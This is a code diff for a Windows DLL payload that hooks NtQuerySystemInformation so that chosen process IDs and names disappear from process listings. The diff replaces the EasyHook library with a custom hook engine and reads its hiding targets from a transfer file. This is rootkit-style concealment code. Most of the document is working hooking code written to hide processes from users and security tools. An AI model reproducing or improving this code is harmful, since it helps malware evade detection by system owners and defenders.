@@ -5,40 +5,33 @@
 //
 #include "Payload.h"
 
-
+#include "../NtHookEngine/NtHookEngine.h"
+/*
 #include <iostream>
 #include <fstream>
 #include <iomanip>
 #include <string>
+*/
 
-
-#include "easyhook.h"
 #include <wchar.h>
 #include <Windows.h>
+
 
 using namespace std;
 
 int *hiddenPIDsList;
 TCHAR **hiddenProcessNames;
 int PIDsNum, procNameNum;
+bool isUp = false;
 
 
-PNtQueryFunc RealNTQueryFunc;
-
-typedef NTSTATUS(*EasyHookFuncType)(void*, void*, void*, TRACED_HOOK_HANDLE);
-typedef int(*EasyHookUnhookFunc)(TRACED_HOOK_HANDLE);
-typedef NTSTATUS(*EasyHookSetExc)(ULONG *, ULONG, TRACED_HOOK_HANDLE);
-typedef NTSTATUS(*EasyHookSetGlobalIncACL)(ULONG *, ULONG);
-typedef NTSTATUS(*LhRemovalFunc)();
+PNtQueryFunc RealNTQueryFunc,OrigAddress;
 
 
-LhRemovalFunc UninstallFunc, WaitForPendingRemovals;
-TRACED_HOOK_HANDLE hHook;
 
 HANDLE hMutex;
 
-/*
-void PrintToFile(const char* s) //just for debugging purposes
+/*void PrintToFile(const char* s) //just for debugging purposes
 {
 	wofstream f;
 	f.open("C:\\Program Files\\Internet Explorer\\debugfile.isf", ofstream::app);
@@ -92,6 +85,7 @@ PSYSTEM_PROCESS_INFO getNextElement(PSYSTEM_PROCESS_INFO spi)
 
 NTSTATUS fakeNTQuery(SYSTEM_INFORMATION_CLASS info_class, PVOID sys_info, ULONG info_length, PULONG return_length)
 {
+	//PrintToFile("Intercepted call!");
 	if (info_class != SystemProcessInformation)
 	{
 		if (RealNTQueryFunc != NULL)
@@ -211,38 +205,36 @@ int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuff
 
 void InitializeDLL()
 {
-	TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE], hookEngLoc[MAX_PATH];
+	NtHookEngineInit();
+	TCHAR pIDsbuff[MAX_LINE], procNameBuff[MAX_LINE];// , hookEngLoc[MAX_PATH];
 	FILE *fp;
 	fopen_s(&fp, INFO_TRANSFER_FILE, "r");
 	fgetws(pIDsbuff, MAX_LINE, fp); //first line - list of pIDs to hide
 	fgetws(procNameBuff, MAX_LINE, fp); //second line - list of process names to hide
-	fgetws(hookEngLoc, MAX_LINE, fp); //third line - location of the Hook Engine (EasyHook) DLL
+	//fgetws(hookEngLoc, MAX_LINE, fp); //third line - location of the Hook Engine DLL
 	pIDsbuff[wcslen(pIDsbuff) - 1] = '\0'; //delete \n
 	procNameBuff[wcslen(procNameBuff) - 1] = '\0';
-	hookEngLoc[wcslen(hookEngLoc) - 1] = '\0';
+	//hookEngLoc[wcslen(hookEngLoc) - 1] = '\0';
 	fclose(fp);
 	PIDsNum = buildPIDsList(pIDsbuff, FALSE, &hiddenPIDsList);
 	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
 	procNameNum = buildProcNameList(procNameBuff, FALSE, &hiddenProcessNames);
-	HMODULE hHookEngineDll = LoadLibrary(hookEngLoc);
-	EasyHookFuncType HookFunction=(EasyHookFuncType)GetProcAddress(hHookEngineDll, "LhInstallHook");
-	EasyHookSetExc SetExcludeACL = (EasyHookSetExc)GetProcAddress(hHookEngineDll, "LhSetExclusiveACL");
-	UninstallFunc = (LhRemovalFunc)GetProcAddress(hHookEngineDll, "LhUninstallAllHooks");
-	WaitForPendingRemovals = (LhRemovalFunc)GetProcAddress(hHookEngineDll, "LhWaitForPendingRemovals");
-	RealNTQueryFunc = (PNtQueryFunc)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
-	hHook = new HOOK_TRACE_INFO();
-	NTSTATUS res = HookFunction(RealNTQueryFunc, fakeNTQuery, NULL,hHook);
-	if (FAILED(res))
-	{
-		return;
-	}
-	
-	ULONG theID[1] = { (ULONG)-1 };
-	SetExcludeACL(theID, 1, hHook); //Exclude impossible threadID
+	//HMODULE hHookEngineDll = LoadLibrary(hookEngLoc);
 
+	OrigAddress = (PNtQueryFunc)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
+	/*if (OrigAddress == NULL)
+		PrintToFile("Can't get original!");
+	PrintToFile("Pre-Hook");*/
+	BOOL hookres = HookFunction((ULONG_PTR)OrigAddress, (ULONG_PTR)&fakeNTQuery);
+	/*if (!hookres)
+		PrintToFile("Can't Hook");*/
+	RealNTQueryFunc = (PNtQueryFunc)GetOriginalFunction((ULONG_PTR)fakeNTQuery);
+	/*if (RealNTQueryFunc == NULL)
+		PrintToFile("Can't get Real Func!");
+	PrintToFile("Post-Hook");*/
 }
 void UnhookDLL()
 {
-	UninstallFunc();
-	WaitForPendingRemovals();
+	UnhookFunction((ULONG_PTR)OrigAddress);
+
 }
